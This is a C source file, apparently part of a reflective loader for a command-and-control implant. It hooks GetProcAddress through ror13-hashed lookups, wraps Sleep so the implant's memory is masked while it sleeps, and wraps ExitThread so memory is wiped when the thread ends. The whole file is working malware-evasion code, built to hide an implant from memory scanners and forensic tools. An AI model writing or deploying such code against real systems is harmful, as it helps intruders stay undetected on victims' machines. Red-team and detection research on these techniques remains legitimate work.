#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "cleanup.h"
#include "tcg.h"

MEMORY_LAYOUT g_memory;

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep      ( DWORD );
DECLSPEC_IMPORT VOID WINAPI KERNEL32$ExitThread ( DWORD );

FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if 
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }
    
    return GetProcAddress ( hModule, lpProcName );
}

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        g_memory = * layout;
    }
}

VOID WINAPI _SleepWithMaskMemory ( DWORD dwMilliseconds )
{
    /*
     * for performance reasons, only mask
     * memory if sleep time is equal to
     * or greater than 1 second 
     */

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, TRUE );
    }

    KERNEL32$Sleep ( dwMilliseconds );

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, FALSE );
    }
}

VOID WINAPI _ExitThreadWithCleanupMemory ( DWORD dwExitCode )
{
    /* free memory */
    cleanup_memory ( &g_memory );
    KERNEL32$ExitThread ( dwExitCode );
}
